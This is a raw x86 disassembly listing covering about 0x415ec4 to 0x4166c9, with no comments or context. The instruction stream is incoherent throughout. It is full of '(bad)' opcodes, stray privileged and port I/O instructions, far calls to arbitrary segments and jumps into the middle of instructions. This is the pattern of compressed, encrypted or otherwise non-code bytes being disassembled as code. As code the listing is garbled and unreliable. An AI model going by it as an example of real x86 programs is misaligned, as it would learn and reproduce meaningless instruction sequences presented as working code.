  415ec4:	and    al,0x5b
  415ec6:	and    esi,DWORD PTR [edi+0x2179df96]
  415ecc:	test   BYTE PTR [ebx+0x9],bh
  415ecf:	push   esi
  415ed0:	xchg   edi,eax
  415ed1:	(bad)  [ebx-0x7fe972d0]
  415ed7:	repnz out 0x42,al
  415eda:	lods   al,BYTE PTR ds:[esi]
  415edb:	push   ebx
  415edc:	dec    esi
  415edd:	push   ecx
  415ede:	(bad)  
  415edf:	mov    ecx,ds
  415ee1:	push   0xffffff9a
  415ee3:	imul   BYTE PTR [ebp+0x50]
  415ee6:	pop    ebp
  415ee7:	inc    edx
  415ee8:	(bad)  
  415ee9:	fadd   DWORD PTR [edx+0x7e6975a5]
  415eef:	jp     0x415ead
  415ef1:	mov    esi,0xb8361118
  415ef6:	aaa    
  415ef7:	pop    eax
  415ef8:	mov    esp,0x765fb82d
  415efd:	das    
  415efe:	or     BYTE PTR [esi+ecx*8],bl
  415f01:	jmp    0x415f05
  415f03:	test   BYTE PTR [eax],bl
  415f05:	ret    
  415f06:	add    cl,BYTE PTR [ebx]
  415f08:	stos   DWORD PTR es:[edi],eax
  415f09:	stos   BYTE PTR es:[edi],al
  415f0a:	retf   0xebf1
  415f0d:	adc    al,0x0
  415f0f:	mov    eax,0x9cd1cb0a
  415f14:	pop    esp
  415f15:	sbb    eax,0x6309d048
  415f1a:	mov    edx,DWORD PTR [ebx-0x4568c1bd]
  415f20:	les    esi,FWORD PTR [ecx-0x7db713b3]
  415f26:	loopne 0x415ef9
  415f28:	(bad)  
  415f29:	adc    edx,ebp
  415f2b:	hlt    
  415f2c:	popf   
  415f2d:	pop    esp
  415f2e:	imul   esi,DWORD PTR [ebx-0x571fd94e],0x5e
  415f35:	push   ebp
  415f36:	cmc    
  415f37:	fnstenv [edi+0x75664cd9]
  415f3d:	data16 (bad) 
  415f3f:	mov    dl,0x98
  415f41:	pushf  
  415f42:	xor    eax,0x8d767636
  415f47:	add    bl,BYTE PTR [ebp-0x77b8e78e]
  415f4d:	jnp    0x415f5e
  415f4f:	or     BYTE PTR [ebx+0x3697912b],ch
  415f55:	add    al,0xc6
  415f57:	push   ebp
  415f58:	gs pop ebp
  415f5a:	sub    esi,DWORD PTR [esi]
  415f5c:	cwde   
  415f5d:	sub    eax,DWORD PTR [ecx-0x28cfb81]
  415f63:	mov    ch,0x46
  415f65:	or     eax,0x8978b21a
  415f6a:	lock fisttp DWORD PTR [edx]
  415f6d:	push   ebp
  415f6e:	repnz mov al,ds:0x36af1aad
  415f74:	scas   al,BYTE PTR es:[edi]
  415f75:	dec    ecx
  415f76:	enter  0xbd0a,0x8f
  415f7a:	mov    edx,0x6b554c6c
  415f7f:	mov    dl,0x61
  415f81:	fstp   DWORD PTR [ebp-0x35]
  415f84:	(bad)
  415f87:	adc    edx,ecx
  415f89:	mov    cl,0x25
  415f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8c:	sub    BYTE PTR [edi+0x77],0x58
  415f90:	fwait
  415f91:	mov    ah,0x16
  415f93:	add    bh,BYTE PTR [ebx+ebp*2+0x4aa0d02f]
  415f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f9b:	out    dx,al
  415f9c:	adc    edx,DWORD PTR [esi+0x3f]
  415f9f:	mov    ds:0x5aae0d8c,eax
  415fa4:	xor    eax,0xdeb72db1
  415fa9:	or     DWORD PTR [esi+0x6d617a70],esp
  415faf:	inc    edx
  415fb0:	cmp    ch,BYTE PTR [edi]
  415fb2:	xchg   edi,eax
  415fb3:	mov    edi,0xae973366
  415fb8:	fwait
  415fb9:	addr16 pop edx
  415fbb:	icebp  
  415fbc:	pop    ss
  415fbd:	inc    esi
  415fbe:	adc    eax,0x801eb390
  415fc3:	cli    
  415fc4:	sbb    al,0xf7
  415fc6:	adc    al,0xdf
  415fc8:	fsub   QWORD PTR [edi]
  415fca:	jl     0x416020
  415fcc:	jbe    0x41601d
  415fce:	and    al,0x3b
  415fd0:	in     eax,dx
  415fd1:	fisttp WORD PTR [eax]
  415fd3:	(bad)  
  415fd4:	fbstp  TBYTE PTR [edx+0x36]
  415fd7:	xchg   ebp,eax
  415fd8:	sbb    eax,0x829330dd
  415fdd:	inc    ebx
  415fde:	push   esp
  415fdf:	jne    0x415ff3
  415fe1:	retf   0xfd49
  415fe4:	clc    
  415fe5:	ds pushf 
  415fe7:	pop    es
  415fe8:	jmp    0x415f86
  415fea:	jb     0x416043
  415fec:	adc    bl,dl
  415fee:	scas   eax,DWORD PTR es:[edi]
  415fef:	push   0x3030af41
  415ff4:	stos   DWORD PTR es:[edi],eax
  415ff5:	test   eax,0xe83560e
  415ffa:	in     eax,0x6e
  415ffc:	jno    0x416010
  415ffe:	mov    al,0x12
  416000:	(bad)  
  416001:	in     al,0x98
  416003:	xor    BYTE PTR [esi],cl
  416005:	out    0x92,eax
  416007:	adc    eax,0x534dc1cd
  41600c:	fwait
  41600d:	clc    
  41600e:	popf   
  41600f:	sub    BYTE PTR [esi-0x55df3b6],0x7e
  416016:	pop    ss
  416017:	pop    edi
  416018:	adc    eax,0x9b1ce030
  41601d:	inc    eax
  41601e:	iret   
  41601f:	jecxz  0x415fe5
  416021:	push   ecx
  416022:	inc    ecx
  416023:	xor    al,0xee
  416025:	push   esi
  416026:	mov    ds:0x9971f112,eax
  41602b:	inc    edi
  41602c:	mov    dh,0xf2
  41602e:	(bad)  
  41602f:	push   esp
  416030:	lahf   
  416031:	loopne 0x415ffc
  416033:	or     al,0xef
  416035:	out    dx,eax
  416036:	(bad)
  41603a:	jb     0x41601d
  41603c:	mov    esi,0x3996f577
  416041:	into   
  416042:	and    DWORD PTR [ebp+0x4022e4d],0x91d709dd
  41604c:	or     edx,ecx
  41604e:	into   
  41604f:	or     eax,0xbfa8a188
  416054:	dec    ebp
  416055:	je     0x41602c
  416057:	pusha  
  416058:	cmc    
  416059:	mov    ebx,0xff1a6abc
  41605e:	add    edx,ebx
  416060:	mov    esi,0xbb9f6d99
  416065:	xchg   esp,eax
  416066:	cmp    BYTE PTR [ebx+0x51],0xa8
  41606a:	sub    eax,0xcb16369b
  41606f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416071:	and    ah,BYTE PTR [edi]
  416073:	mov    esi,DWORD PTR [di+0x38]
  416077:	rcr    DWORD PTR [ebp-0x51],0x33
  41607b:	out    0x7e,al
  41607d:	mov    WORD PTR [eax-0x17222e77],ds
  416083:	rcpps  xmm6,xmm5
  416086:	pop    esp
  416087:	mov    edx,0x480eaf18
  41608c:	inc    ebx
  41608d:	mov    ecx,0x8239dab1
  416092:	add    BYTE PTR [edx],ah
  416094:	mov    edx,0x7b71dddf
  416099:	lods   eax,DWORD PTR ds:[esi]
  41609a:	neg    edi
  41609c:	fnstsw WORD PTR ds:0xb4746cd5
  4160a2:	fsub   QWORD PTR [eax-0x19c5b3d5]
  4160a8:	mov    DWORD PTR [esi+0x1c],eax
  4160ab:	mov    dh,0x69
  4160ad:	cs inc esp
  4160af:	fsub   st,st(5)
  4160b1:	in     eax,dx
  4160b2:	cmp    bl,bl
  4160b4:	mov    ch,0x49
  4160b6:	inc    ebp
  4160b7:	push   esi
  4160b8:	xor    esp,DWORD PTR [edi-0x2b1557e7]
  4160be:	mov    eax,ds:0x392f182
  4160c3:	cmp    edx,DWORD PTR [edi+eiz*4]
  4160c6:	xchg   edx,eax
  4160c7:	push   edx
  4160c8:	xchg   esp,eax
  4160c9:	loopne 0x4160bb
  4160cb:	pushf  
  4160cc:	loopne 0x41609c
  4160ce:	xchg   esi,eax
  4160cf:	inc    edi
  4160d0:	inc    esp
  4160d1:	jecxz  0x416061
  4160d3:	data16 mov al,0xf5
  4160d6:	jne    0x416070
  4160d8:	cdq    
  4160d9:	dec    ebp
  4160da:	sub    al,0xba
  4160dc:	mov    al,0xb0
  4160de:	mov    eax,0x43e03680
  4160e3:	inc    edi
  4160e4:	add    DWORD PTR [eax-0x4f1f3aa8],edx
  4160ea:	outs   dx,DWORD PTR ds:[esi]
  4160eb:	jb     0x4160f3
  4160ed:	call   0x1a24:0x383fe39b
  4160f4:	mov    edi,0x4c438e90
  4160f9:	frstor ds:0xaaa2b86c
  4160ff:	js     0x416168
  416101:	neg    edi
  416103:	fld    TBYTE PTR [ebp+0x332f3683]
  416109:	jo     0x4160e3
  41610b:	mov    dl,0x8d
  41610d:	pop    edx
  41610e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41610f:	mov    al,ds:0x8a00de01
  416114:	cs pushf 
  416116:	sbb    al,0x50
  416118:	jge    0x416142
  41611a:	xor    DWORD PTR [edi+0x7e47181],ebx
  416120:	rcr    BYTE PTR [ebp+0x2f5ed0b8],0x66
  416127:	cmp    edi,edi
  416129:	and    eax,0x5379582d
  41612e:	or     edx,esi
  416130:	test   DWORD PTR [ebx+0x42],ebp
  416133:	jns    0x416166
  416135:	inc    esi
  416136:	xchg   ebp,eax
  416137:	or     BYTE PTR [eax-0x5a6ef824],bh
  41613d:	loope  0x4160d8
  41613f:	scas   eax,DWORD PTR es:[edi]
  416140:	int3   
  416141:	pop    ss
  416142:	(bad)  
  416143:	jb     0x4160e1
  416145:	shr    al,1
  416147:	xchg   ecx,eax
  416148:	imul   esi,DWORD PTR [ecx],0xb8260d08
  41614e:	(bad)  
  41614f:	scas   eax,DWORD PTR es:[edi]
  416150:	fldcw  WORD PTR [ebx+eiz*2-0x52c0f749]
  416157:	lock mov bh,dh
  41615a:	dec    ebp
  41615b:	fistp  DWORD PTR [edi]
  41615d:	retf   
  41615e:	shl    DWORD PTR [edx+0xd],0xbb
  416162:	outs   dx,DWORD PTR ds:[esi]
  416163:	jecxz  0x4160ee
  416165:	xor    DWORD PTR [ebx+0x1de8b7dd],0xce1cc1f9
  41616f:	int3   
  416170:	jmp    0x4161ef
  416172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416173:	xchg   BYTE PTR [edi+0x6faca0f8],dh
  416179:	div    DWORD PTR [edx]
  41617b:	push   0x117ad767
  416180:	xchg   esi,eax
  416182:	icebp  
  416183:	cmp    ebx,DWORD PTR [edx]
  416185:	add    al,0x34
  416187:	test   eax,0xfc94e97a
  41618c:	sbb    eax,0x5fcdadfe
  416191:	mov    edx,edi
  416193:	outs   dx,BYTE PTR ds:[esi]
  416194:	retf   
  416195:	inc    eax
  416196:	ja     0x4161b4
  416198:	out    dx,eax
  416199:	shl    DWORD PTR [edi-0x4ea6f0e7],0x11
  4161a0:	iret   
  4161a1:	and    BYTE PTR [eax],cl
  4161a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a4:	pop    edx
  4161a5:	mov    cl,0x7d
  4161a7:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4161a9:	shl    esp,1
  4161ab:	xor    bl,BYTE PTR [eax+eax*8-0x1a]
  4161af:	adc    eax,0x450272cc
  4161b4:	cmp    ecx,DWORD PTR [ecx+ecx*8+0x3765ad30]
  4161bb:	push   eax
  4161bc:	mov    BYTE PTR [edi],dh
  4161be:	jno    0x416158
  4161c0:	fs mov dl,0x31
  4161c3:	adc    eax,0xafe222be
  4161c8:	xchg   ecx,eax
  4161c9:	xchg   esi,eax
  4161ca:	add    al,BYTE PTR [ebx+0x42]
  4161cd:	or     edi,DWORD PTR [eax-0x4bd1267e]
  4161d3:	loopne 0x4161ca
  4161d5:	addr16 push esi
  4161d7:	xor    al,0x47
  4161d9:	inc    ebx
  4161da:	add    DWORD PTR [edi+esi*1+0x1],ebp
  4161de:	popa   
  4161df:	int    0xca
  4161e1:	(bad)  
  4161e2:	in     eax,0x91
  4161e4:	call   0x5f92:0x83274f6
  4161eb:	mov    ecx,DWORD PTR [esi-0x61]
  4161ee:	addr16 push ss
  4161f0:	adc    DWORD PTR es:[ecx-0x4f],0x197d0250
  4161f8:	push   ecx
  4161f9:	sub    eax,0x9910974f
  4161fe:	cmc    
  4161ff:	add    eax,0xef0a5326
  416204:	inc    esp
  416205:	or     bl,dl
  416207:	push   ss
  416208:	(bad)  
  416209:	jnp    0x416201
  41620b:	jne    0x416266
  41620d:	imul   eax,DWORD PTR [ebx-0xa7c0d6f],0x9a9d9889
  416217:	dec    edi
  416218:	adc    bh,ch
  41621a:	(bad)  
  41621b:	jmp    0x90b1:0x4baa264
  416222:	push   es
  416223:	mov    ebx,0x5fd906f0
  416228:	xchg   DWORD PTR [eax-0x66],edi
  41622b:	cmp    eax,0xe82e37ef
  416230:	cli    
  416231:	mov    edi,0x984af4b2
  416236:	daa    
  416237:	and    esp,esp
  416239:	and    BYTE PTR [edi+0x2e279527],ah
  41623f:	mov    esi,0xbcdd66f2
  416244:	gs mov edi,0x18aaa0f1
  41624a:	(bad)  
  41624b:	aam    0x7f
  41624d:	sub    BYTE PTR [ebp+0x187b9dd0],dl
  416253:	nop
  416254:	lahf   
  416255:	and    al,BYTE PTR ds:0xe129b0fe
  41625b:	(bad)  
  41625d:	mov    al,ds:0x54c6217f
  416262:	xchg   esp,eax
  416263:	jmp    0x3c60:0xaf5a453d
  41626a:	shr    DWORD PTR [esp+edi*1+0x7f879638],1
  416271:	sbb    DWORD PTR ds:[eax+edx*1],esp
  416275:	xchg   BYTE PTR [esi-0x5af2dfd4],al
  41627b:	pop    es
  41627c:	popa   
  41627d:	test   eax,0x70ff658f
  416282:	std    
  416283:	mov    eax,0x2b24f4b8
  416288:	jb     0x416279
  41628a:	mov    ebx,0xe7f929d8
  41628f:	adc    al,0x8e
  416291:	add    al,0xf2
  416293:	dec    edx
  416294:	clc    
  416295:	rcl    DWORD PTR [ebx+0x2ba9811d],cl
  41629b:	sbb    eax,0x36ce6c4d
  4162a0:	test   eax,0x6db81f6d
  4162a5:	ja     0x416290
  4162a7:	sbb    esi,DWORD PTR [ebx+0x1e]
  4162aa:	adc    al,0xfe
  4162ac:	scas   al,BYTE PTR es:[edi]
  4162ad:	mov    ah,0x37
  4162af:	(bad)  
  4162b0:	test   al,0xf9
  4162b2:	fs loopne 0x4162a8
  4162b5:	mov    cl,0xb0
  4162b7:	nop
  4162b8:	mov    eax,0xed0e8fb1
  4162bd:	call   0xa6c:0x744cc6b3
  4162c4:	xor    ch,BYTE PTR [ebx]
  4162c6:	xchg   BYTE PTR [edi+edi*4+0x7f],al
  4162ca:	sti    
  4162cb:	shl    esi,1
  4162cd:	add    bh,0x26
  4162d0:	push   0xe5692be3
  4162d5:	fs in  al,0x2e
  4162d8:	sub    esp,DWORD PTR [eax]
  4162da:	xor    eax,0xe36ccbcf
  4162df:	jnp    0x4162b2
  4162e1:	es xor eax,0x7052902
  4162e7:	inc    esi
  4162e8:	leave  
  4162e9:	xor    BYTE PTR [eax-0x57fe3826],cl
  4162ef:	or     bh,bl
  4162f1:	in     eax,0x39
  4162f3:	in     eax,dx
  4162f4:	fistp  QWORD PTR [esi-0x64203393]
  4162fa:	(bad)  
  4162fb:	cmp    bh,BYTE PTR [ecx-0x45b9e063]
  416301:	add    edi,edi
  416303:	dec    edx
  416304:	xchg   esp,eax
  416305:	clc    
  416306:	fwait
  416307:	pop    ds
  416308:	mov    DWORD PTR [esi+0x7dd3415d],edx
  41630e:	adc    esp,DWORD PTR [edx+0x5518d9e3]
  416314:	push   ebx
  416315:	fiadd  DWORD PTR [ecx]
  416317:	in     eax,0x65
  416319:	jg     0x416351
  41631b:	sub    DWORD PTR [edi+0x33483aa5],0xa29aa2a4
  416325:	mov    dx,0x4eff
  416329:	inc    eax
  41632a:	mov    ds:0x80dbd392,al
  41632f:	add    esp,DWORD PTR [edi]
  416331:	inc    edi
  416332:	push   ebp
  416333:	mov    cl,0xa1
  416335:	jmp    0x3235f962
  41633a:	out    0x38,al
  41633c:	pop    edx
  41633d:	cdq    
  41633e:	mul    ch
  416340:	mov    ds:0x612a5623,al
  416345:	pop    esi
  416346:	xor    al,0x15
  416348:	ret    0xf417
  41634b:	pop    ecx
  41634c:	adc    ebx,DWORD PTR es:[esi+0x621120f0]
  416353:	or     BYTE PTR [eax+0x24],0xb3
  416357:	fisub  WORD PTR ds:0x3843ff03
  41635d:	cmc    
  41635e:	jmp    0x234067d5
  416363:	push   DWORD PTR [ecx-0x200e4c1a]
  416369:	out    0xdf,al
  41636b:	int    0xd8
  41636d:	mov    bh,0xb0
  41636f:	cmp    esi,0xffffff99
  416372:	pusha  
  416373:	in     eax,0x4a
  416375:	mul    edi
  416377:	adc    BYTE PTR [ebp-0x60],ah
  41637a:	add    edx,DWORD PTR [edi-0x6752214d]
  416380:	mov    dh,0xe4
  416382:	repnz xchg esp,eax
  416384:	ss xor esp,ecx
  416387:	icebp  
  416388:	mov    esi,ebx
  41638a:	mov    ds:0x5cded953,al
  41638f:	daa    
  416390:	out    0xfb,al
  416392:	or     al,0x9f
  416394:	lods   al,BYTE PTR ds:[esi]
  416395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416396:	add    bh,BYTE PTR [ecx-0xe8a34ff]
  41639c:	nop
  41639d:	xchg   ebx,eax
  41639e:	inc    edi
  41639f:	imul   ecx,DWORD PTR [esi],0xffffffd9
  4163a2:	xor    edi,ecx
  4163a4:	imul   ebx,DWORD PTR [esi+0x71],0x1534de72
  4163ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ac:	pop    esi
  4163ad:	xchg   ecx,eax
  4163ae:	aad    0x34
  4163b0:	cmp    ebx,edi
  4163b2:	inc    ecx
  4163b3:	int    0xbc
  4163b5:	fidiv  DWORD PTR [esi]
  4163b7:	push   ecx
  4163b8:	inc    ebx
  4163b9:	into   
  4163ba:	xchg   ecx,eax
  4163bb:	mov    al,ds:0xb1e361ac
  4163c0:	pop    edi
  4163c1:	stos   BYTE PTR es:[edi],al
  4163c2:	mov    esp,eax
  4163c4:	es pop edx
  4163c6:	into   
  4163c7:	jnp    0x41635d
  4163c9:	mov    cl,0x73
  4163cb:	mov    cl,0xfe
  4163cd:	neg    DWORD PTR [ebp-0x6]
  4163d0:	pop    ecx
  4163d1:	xlat   BYTE PTR ds:[ebx]
  4163d2:	inc    esp
  4163d3:	or     BYTE PTR [eax],bl
  4163d5:	sbb    esp,DWORD PTR [ebp-0x5e]
  4163d8:	inc    eax
  4163d9:	ret    0x9cb
  4163dc:	mov    ah,0x97
  4163de:	mov    eax,ds:0xbb737c2b
  4163e3:	xchg   esp,eax
  4163e4:	(bad)  [eax]
  4163e6:	jns    0x4163d5
  4163e8:	scas   eax,DWORD PTR es:[edi]
  4163e9:	daa    
  4163ea:	xor    al,0xf7
  4163ec:	mov    WORD PTR [ecx-0x7c919d1d],gs
  4163f2:	lahf   
  4163f3:	(bad)  
  4163f4:	xchg   ebp,eax
  4163f5:	sub    al,0x87
  4163f7:	adc    dh,BYTE PTR [edi-0x74]
  4163fa:	adc    BYTE PTR [ecx+0x3a],0xcd
  4163fe:	or     eax,0x50b768f
  416403:	push   cs
  416404:	ds add ch,dl
  416407:	inc    ecx
  416408:	jmp    0x416438
  41640a:	mov    BYTE PTR ds:0x140d83f7,bh
  416410:	int3   
  416411:	aaa    
  416412:	cmp    DWORD PTR [ebp+0x557a78df],ebx
  416418:	dec    edx
  416419:	stc    
  41641a:	scas   al,BYTE PTR es:[edi]
  41641b:	mov    WORD PTR [eax-0x67395b64],ds
  416421:	out    dx,eax
  416422:	das    
  416423:	push   ebx
  416424:	inc    edx
  416425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416426:	fxch   st(0)
  416428:	dec    esp
  416429:	mov    WORD PTR [edx+0x6f],?
  41642c:	retf   0x9e59
  41642f:	add    ebp,ebp
  416431:	into   
  416432:	sahf   
  416433:	es (bad) 
  416435:	fistp  WORD PTR [ecx-0x3aeed8bc]
  41643b:	mov    ds:0xc842e5a,eax
  416440:	adc    BYTE PTR [ebp+0x109e413a],ah
  416446:	ds fwait
  416448:	ds inc eax
  41644a:	out    dx,eax
  41644b:	sbb    al,0x84
  41644d:	xchg   ecx,eax
  41644e:	dec    ecx
  41644f:	shr    al,cl
  416451:	jge    0x416473
  416453:	mov    dl,BYTE PTR [edi]
  416455:	loopne 0x41645b
  416457:	push   esi
  416458:	xchg   ecx,eax
  416459:	xchg   DWORD PTR [edx+0x5aeee7f],esi
  41645f:	xchg   ebp,eax
  416460:	xor    edi,eax
  416462:	out    dx,al
  416463:	idiv   BYTE PTR [ebx-0x2106165e]
  416469:	add    BYTE PTR [ecx],dl
  41646b:	xor    BYTE PTR [ebx+0x68],ch
  41646e:	cmp    dh,0x6e
  416471:	aam    0xa3
  416473:	add    edx,ebx
  416475:	pop    esi
  416476:	jmp    0x64a41d41
  41647b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41647c:	sbb    al,0x5
  41647e:	xor    DWORD PTR fs:[edx],ecx
  416481:	or     al,0xf9
  416483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416484:	xchg   ecx,eax
  416485:	sub    al,0x45
  416487:	add    DWORD PTR [ebp+0x36],eax
  41648a:	xchg   esi,eax
  41648b:	push   ecx
  41648c:	shr    edi,cl
  41648e:	sbb    eax,0xad92617
  416493:	arpl   WORD PTR [edi],bx
  416495:	dec    esp
  416496:	loop   0x41650f
  416498:	cmp    ebx,DWORD PTR [edx+0x34]
  41649b:	stos   BYTE PTR es:[di],al
  41649d:	cmp    eax,0x83674101
  4164a2:	adc    DWORD PTR [ebx-0x773af6b2],ebp
  4164a8:	xchg   DWORD PTR [edx],ebx
  4164aa:	or     ecx,DWORD PTR [edi]
  4164ac:	add    al,0xd9
  4164ae:	xchg   esi,eax
  4164af:	xor    eax,0x40e9dd2e
  4164b4:	shl    ch,0xf2
  4164b7:	imul   edx,DWORD PTR [ecx-0x34],0xffffff89
  4164bb:	mov    esp,0x869a8880
  4164c0:	addr16 cmp eax,0xacc6dae1
  4164c6:	out    dx,eax
  4164c7:	pop    es
  4164c8:	je     0x4164e6
  4164ca:	sub    bh,dh
  4164cc:	adc    BYTE PTR ds:[edx+edi*4-0x2d],bh
  4164d1:	les    ebp,FWORD PTR [edx]
  4164d3:	or     cl,bl
  4164d5:	add    ebx,DWORD PTR [eax]
  4164d7:	xor    BYTE PTR [eax+0x47],al
  4164da:	aad    0x4e
  4164dc:	pop    ebx
  4164dd:	pop    ecx
  4164de:	xlat   BYTE PTR ds:[ebx]
  4164df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e0:	jecxz  0x41649d
  4164e2:	xchg   edx,eax
  4164e3:	popa   
  4164e4:	sbb    al,0x5c
  4164e6:	(bad)  
  4164e7:	clc    
  4164e8:	mov    ebp,0x9b481c18
  4164ed:	mov    cl,0x67
  4164ef:	xchg   esi,eax
  4164f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f1:	jle    0x4164c3
  4164f3:	vmovaps ymm7,YMMWORD PTR [edx+0x6a]
  4164f8:	inc    esi
  4164f9:	into   
  4164fa:	jo     0x416527
  4164fc:	mov    dh,BYTE PTR [esp+eax*4-0x2b38aa8c]
  416503:	adc    DWORD PTR [eax-0x5dec6dd9],ebx
  416509:	call   0xa2c203ef
  41650e:	sar    al,1
  416510:	dec    ebx
  416511:	(bad)  
  416512:	cmp    esp,DWORD PTR [edx-0x6a]
  416515:	adc    DWORD PTR [ecx],ecx
  416517:	dec    ecx
  416518:	out    0x44,eax
  41651a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651b:	cmp    al,0xc2
  41651d:	pop    eax
  41651e:	or     dh,0xeb
  416521:	loop   0x4164be
  416523:	mov    esi,0x233a4381
  416528:	pop    eax
  416529:	ret    
  41652a:	mov    esp,edx
  41652c:	jg     0x41651f
  41652e:	sub    ebx,ecx
  416530:	dec    ecx
  416531:	test   eax,0x9ba3f000
  416536:	outs   dx,BYTE PTR gs:[esi]
  416538:	and    esi,ecx
  41653a:	and    DWORD PTR [eax+esi*4+0x3],esi
  41653e:	pop    esp
  41653f:	cdq    
  416540:	fdiv   DWORD PTR [edi+edx*2]
  416543:	mov    edi,0xc0349381
  416548:	shr    BYTE PTR [ecx+0x4c],cl
  41654b:	add    BYTE PTR [ebx+0x2a],bl
  41654e:	and    DWORD PTR [ebx],eax
  416550:	neg    DWORD PTR [eax+0xdd5cbea]
  416556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416557:	adc    ebp,DWORD PTR [eax-0x48]
  41655a:	dec    edi
  41655b:	rol    BYTE PTR [esi],1
  41655d:	int3   
  41655e:	addr16 ret 0xccad
  416562:	lahf   
  416563:	cs push ss
  416565:	leave  
  416566:	bound  esp,QWORD PTR [eax+esi*8-0x6fd9a0f2]
  41656d:	add    bl,dh
  41656f:	pop    esp
  416570:	jl     0x41657b
  416572:	aad    0xcd
  416574:	mov    WORD PTR [edi-0x13239283],gs
  41657a:	mov    esi,0x50ecdfa0
  41657f:	fisttp QWORD PTR ds:[ecx-0x29]
  416583:	sub    bl,BYTE PTR [edx]
  416585:	adc    DWORD PTR [esi+0x4b9ace57],ebp
  41658b:	pop    es
  41658c:	pop    ebx
  41658d:	jmp    DWORD PTR [ebp-0x62]
  416590:	adc    ecx,DWORD PTR ds:0x6b59dfcd
  416596:	jns    0x416525
  416598:	jo     0x416613
  41659a:	in     eax,dx
  41659b:	mov    edx,0x47d0314e
  4165a0:	cmp    DWORD PTR [edx+0x26161584],esi
  4165a6:	and    bl,bh
  4165a8:	jns    0x416549
  4165aa:	cmp    eax,0xb961258a
  4165af:	call   0x32fceb32
  4165b4:	shr    DWORD PTR ds:0x25d0,0x9c
  4165ba:	mov    ah,0xbc
  4165bc:	or     al,0xa8
  4165be:	xor    eax,0xcd27c106
  4165c3:	int    0x43
  4165c5:	enter  0xc1e1,0xfa
  4165c9:	add    eax,0x83a4d20a
  4165ce:	test   BYTE PTR [edx],bl
  4165d0:	rcl    DWORD PTR [eax-0x4f364434],1
  4165d6:	shl    al,cl
  4165d8:	jmp    0x4165d9
  4165da:	jle    0x416560
  4165dc:	push   ebp
  4165dd:	retf   0x5fdd
  4165e0:	scas   eax,DWORD PTR es:[edi]
  4165e1:	pop    ss
  4165e2:	(bad)  
  4165e3:	push   ebx
  4165e4:	dec    edx
  4165e5:	mov    eax,0xd4bdf7c2
  4165ea:	mov    ecx,0x666af37e
  4165ef:	gs xchg esp,eax
  4165f1:	jnp    0x41659c
  4165f3:	jb     0x416584
  4165f5:	fdivr  QWORD PTR [esi-0x10fa1ac4]
  4165fb:	add    dh,BYTE PTR [ebp+0x3]
  4165fe:	sbb    bh,BYTE PTR [esi+0x19]
  416601:	sub    BYTE PTR [ecx+ebp*8],dl
  416604:	mov    ch,0x8b
  416606:	in     al,dx
  416607:	xor    eax,DWORD PTR [ebx+eiz*1+0x49]
  41660b:	sbb    bl,BYTE PTR [edi]
  41660d:	mov    esp,0xa2e8d872
  416612:	in     al,dx
  416613:	sub    BYTE PTR [ecx],0x45
  416616:	scas   eax,DWORD PTR es:[edi]
  416617:	inc    esi
  416618:	add    cl,bl
  41661a:	and    eax,0x513a7862
  41661f:	cmp    BYTE PTR [esi],al
  416621:	mov    edx,0xdc009ea6
  416626:	push   0xace2c153
  41662b:	adc    edx,DWORD PTR [eax-0x59]
  41662e:	jmp    0x416613
  416630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416631:	aam    0xb0
  416633:	xchg   ebx,eax
  416634:	fwait
  416635:	sbb    eax,0xed0b2306
  41663a:	jbe    0x416686
  41663c:	and    ah,0x92
  41663f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416640:	mov    eax,0x4758d9da
  416645:	aas    
  416646:	aas    
  416647:	pop    esp
  416648:	mov    eax,ds:0xdb600425
  41664d:	and    al,BYTE PTR [ecx+0x66536e19]
  416653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416654:	arpl   WORD PTR [esi+0x17657a3a],dx
  41665a:	imul   BYTE PTR [eax+0x296219b5]
  416660:	je     0x41666d
  416662:	dec    ecx
  416663:	mov    esi,0x940cc916
  416668:	popf   
  416669:	data16 repnz adc bh,BYTE PTR [ecx+ebp*2]
  41666e:	mov    esp,0xc49fe440
  416673:	scas   al,BYTE PTR es:[edi]
  416674:	shl    edi,cl
  416676:	fcmovnb st,st(0)
  416678:	dec    edx
  416679:	add    al,0x6b
  41667b:	idiv   DWORD PTR [ebp+edx*2+0x72125dbd]
  416682:	or     eax,0x8713cf46
  416687:	xchg   ebx,eax
  416688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416689:	jp     0x4166d0
  41668b:	bnd jnp 0x4166a0
  41668e:	leave  
  41668f:	jo     0x416706
  416691:	ds stc 
  416693:	scas   eax,DWORD PTR es:[edi]
  416694:	daa    
  416695:	sub    ch,BYTE PTR [edi]
  416697:	out    dx,eax
  416698:	jg     0x4166b9
  41669a:	xlat   BYTE PTR ds:[ebx]
  41669b:	ror    DWORD PTR [esi],cl
  41669d:	nop
  41669e:	adc    eax,0x5daa22bc
  4166a3:	scas   eax,DWORD PTR es:[edi]
  4166a4:	jo     0x4166d6
  4166a6:	test   eax,0xfbd9a623
  4166ab:	stos   DWORD PTR es:[edi],eax
  4166ac:	ret    
  4166ad:	aad    0x4
  4166af:	fstp   DWORD PTR [eax]
  4166b1:	loope  0x416702
  4166b3:	fdiv   QWORD PTR [edi-0x8]
  4166b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166b7:	js     0x4166ac
  4166b9:	sti    
  4166ba:	mov    eax,0xc02fa274
  4166bf:	(bad)  
  4166c0:	mov    bh,0x73
  4166c2:	sbb    DWORD PTR [esi-0xb],0xb24c447f
  4166c9:	mov    ds:0x879103ff,al
